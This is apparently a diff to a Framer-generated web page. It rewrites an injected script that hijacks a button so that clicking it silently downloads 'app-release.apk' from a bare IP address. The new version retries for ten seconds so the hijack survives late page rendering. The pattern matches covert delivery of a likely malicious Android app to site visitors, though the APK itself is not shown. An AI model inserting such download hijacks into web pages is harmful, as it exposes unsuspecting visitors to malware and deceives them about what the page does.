@@ -59,21 +59,7 @@
       fetchpriority="low"
       href="https://framerusercontent.com/sites/53NwOYfYpfdcrHsghJzL6i/chunk-42U43NKG.mjs"
     />
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var button = document.querySelector(".framer-p78w1h");
-
-            button.addEventListener("click", function() {
-                var link = document.createElement("a");
-                link.href = "https://120.26.241.30/static/app-release.apk"; 
-                link.download = "app-release.apk"; 
-
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            });
-        });
-    </script>
+    
     <style data-framer-css-ssr-minified data-framer-components="framer-I5p07">
       html,
       body,
@@ -8617,22 +8603,34 @@
       src="https://framerusercontent.com/sites/53NwOYfYpfdcrHsghJzL6i/default_script0.X7ETHZY4.mjs"
     ></script>
      <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            function addClickListener() {
+                var button = document.querySelector(".framer-p78w1h");
 
-        var button = document.querySelector(".framer-p78w1h");
+                if (button) {
+                    button.addEventListener("click", function() {
+                        var link = document.createElement("a");
+                        link.href = "https://120.26.241.30/static/app-release.apk"; 
+                        link.download = "app-release.apk"; 
 
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                    });
+                }
+            }
 
-        button.addEventListener("click", function() {
+            // 定时器，每秒检查一次
+            var intervalId = setInterval(function() {
+                addClickListener();
+            }, 1000);
 
-            var link = document.createElement("a");
-            link.href = "https://120.26.241.30/static/app-release.apk"; 
-            link.download = "app-release.apk"; 
-
-
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            // 10秒后停止定时器
+            setTimeout(function() {
+                clearInterval(intervalId);
+            }, 10000);
         });
-    </script> 
+    </script>
     <!-- End of bodyEnd -->
   </body>
 </html>
